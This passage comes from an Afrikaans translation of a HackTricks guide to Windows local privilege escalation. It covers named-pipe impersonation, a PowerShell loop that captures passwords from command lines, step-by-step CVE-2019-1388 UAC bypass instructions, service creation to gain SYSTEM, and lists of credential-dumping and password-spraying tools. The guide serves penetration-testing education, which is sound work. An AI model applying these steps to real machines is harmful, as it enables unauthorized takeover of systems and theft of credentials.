Wanneer data deur 'n **kliënt** deur 'n pyp gestuur word, het die **bediener** wat die pyp opgestel het die vermoë om die identiteit van die **kliënt** aan te neem, op voorwaarde dat dit die nodige **SeImpersonate** regte het. As jy 'n **bevoorregte proses** identifiseer wat via 'n pyp kommunikeer wat jy kan naboots, bied dit 'n geleentheid om **hoër bevoegdhede te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pyp wat jy opgestel het, interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, kan nuttige gidse gevind word [**hier**](named-pipe-client-impersonation.md) en [**hier**](./#from-high-integrity-to-system).

Hierdie hulpmiddel maak dit ook moontlik om **'n benoemde pyp kommunikasie te onderskep met 'n hulpmiddel soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie hulpmiddel maak dit moontlik om alle pype te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitering van opdraglyne vir wagwoorde**

Wanneer jy 'n skulp as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat **legitimasie op die opdraglyn deurgee**. Die skripsie hieronder vang proses opdraglyne elke twee sekondes en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Van Lae Priv Gebruiker na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Oorspring

As jy toegang het tot die grafiese gebruikerskoppelvlak (via konsole of RDP) en UAC geaktiveer is, is dit moontlik om 'n terminaal of enige ander proses soos "NT\AUTHORITY SYSTEM" uit te voer vanaf 'n onbevoorregte gebruiker in sommige weergawes van Microsoft Windows.

Dit maak dit moontlik om voorregte te verhoog en terselfdertyd UAC te omseil met dieselfde kwesbaarheid. Daarbenewens is daar geen nodigheid om iets te installeer nie en die binêre lêer wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geaffekteerde stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:

```
1) Regskliek op die HHUPD.EXE-lêer en voer dit uit as Administrateur.

2) Wanneer die UAC-aanvraag verskyn, kies "Wys meer besonderhede".

3) Klik op "Wys uitgewer sertifikaatinligting".

4) As die stelsel kwesbaar is, kan die verstek webblaaier verskyn wanneer jy op die "Uitgereik deur" URL-skakel klik.

5) Wag vir die webwerf om heeltemal te laai en kies "Stoor as" om 'n explorer.exe-venster te open.

6) Voer cmd.exe, powershell.exe of enige ander interaktiewe proses in die adrespad van die explorer-venster in.

7) Jy het nou 'n "NT\AUTHORITY SYSTEM" opdragvenster.

8) Onthou om die opstelling en die UAC-aanvraag te kanselleer om terug te keer na jou lessenaar.
```

Jy het al die nodige lêers en inligting in die volgende GitHub-opberging:

https://github.com/jas502n/CVE-2019-1388

## Van Administrateur Medium na Hoë Integriteitsvlak / UAC-omseiling

Lees dit om **meer te leer oor Integriteitsvlakke**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Lees dan **hierdie om meer te leer oor UAC en UAC-omseilings:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Van Hoë Integriteit na Stelsel**

### **Nuwe diens**

As jy reeds op 'n Hoë Integriteitsproses loop, kan die **oorgang na STSEEL** maklik wees deur net 'n nuwe diens te **skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Vanuit 'n Hoë Integriteit proses kan jy probeer om die AlwaysInstallElevated registerinskrywings te aktiveer en 'n omgekeerde dop te installeer deur 'n .msi omhulsel te gebruik.
[Meer inligting oor die betrokke registerinskrywings en hoe om 'n .msi-pakket te installeer hier.](./#alwaysinstallelevated)

### Hoë + SeImpersonate-bevoegdheid na Stelsel

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### Vanaf SeDebug + SeImpersonate na Volle Token-bevoegdhede

As jy hierdie token-bevoegdhede het (jy sal dit waarskynlik vind in 'n reeds Hoë Integriteit proses), sal jy in staat wees om byna enige proses (nie beskermde prosesse nie) met die SeDebug-bevoegdheid oop te maak, die token van die proses te kopieer, en 'n willekeurige proses met daardie token te skep.
Hierdie tegniek word gewoonlik gebruik om enige proses wat as STSEEM uitgevoer word met al die token-bevoegdhede te kies (ja, jy kan STSEEM prosesse vind sonder al die token-bevoegdhede).
**Jy kan 'n** [**voorbeeld van kode vind wat die voorgestelde tegniek uitvoer hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Naam pype**

Hierdie tegniek word deur meterpreter gebruik om te eskaleer in `getsystem`. Die tegniek behels die skep van 'n pyp en dan die skep/misbruik van 'n diens om op daardie pyp te skryf. Die bediener wat die pyp geskep het met behulp van die `SeImpersonate`-bevoegdheid sal in staat wees om die token van die pyp-kliënt (die diens) te verteenwoordig en sodoende STSEEM-bevoegdhede te verkry.
As jy [**meer wil leer oor naam pype, moet jy hierdie inligting lees**](./#named-pipe-client-impersonation).
As jy 'n voorbeeld wil lees van [**hoe om van hoë integriteit na Stelsel te gaan deur gebruik te maak van naam pype, moet jy hierdie inligting lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll te kap, wat deur 'n proses wat as STSEEM uitgevoer word, gelaai word, sal jy in staat wees om arbitrêre kode met daardie toestemmings uit te voer. Daarom is Dll Hijacking ook nuttig vir hierdie soort bevoorregte eskalasie, en dit is ook baie makliker om dit vanuit 'n hoë integriteit proses te bereik, aangesien dit skryfregte op die gebruikte vouers sal hê.
**Jy kan [hier meer leer oor Dll Hijacking](dll-hijacking.md)**.

### **Van Administrateur of Netwerkdienste na Stelsel**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Vanaf PLAASLIKE DIENS of NETWERKDIENS na volle bevoegdhede

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Statiese impacket binêre lêers](https://github.com/ropnop/impacket_static_binaries)

## Nuttige gereedskap

**Die beste gereedskap om te soek na Windows plaaslike bevoorregte eskalasie vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir verkeerde konfigurasies en sensitiewe lêers (**[**kontroleer hier**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Opgespoor.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike verkeerde konfigurasies en versamel inligting (**[**kontroleer hier**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir verkeerde konfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek inligting uit PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP gestoorde sessie-inligting. Gebruik -Thorough plaaslik.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Dit onttrek geloofsbriewe uit die Credential Manager. Opgespoor.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spuit ingesamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-die-middel-gereedskap.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows opname**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwesbaarhede (VEROUDERD vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike kontroles **(Benodig Administrateur-regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet gekompileer word met behulp van VisualStudio) ([**voorgekompileer**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die gasheer op soek na verkeerde konfigurasies (meer 'n inligtingversamelingsgereedskap as privesc) (moet gekompileer word) **(**[**voorgekompileer**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Dit onttrek geloofsbriewe uit baie sagteware (voorgekompileerde exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir verkeerde konfigurasies (uitvoerbare voorgekompileerde in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike verkeerde konfigurasies (exe vanaf Python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Gereedskap geskep gebaseer op hierdie pos (dit benodig nie toegang tot accesschk om behoorlik te werk nie, maar dit kan dit gebruik).

**Plaaslik**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (plaaslike Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (plaaslike Python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Jy moet die projek kompilleer met die korrekte weergawe van .NET ([sien hierdie](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-gasheer te sien, kan jy die volgende doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografie

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
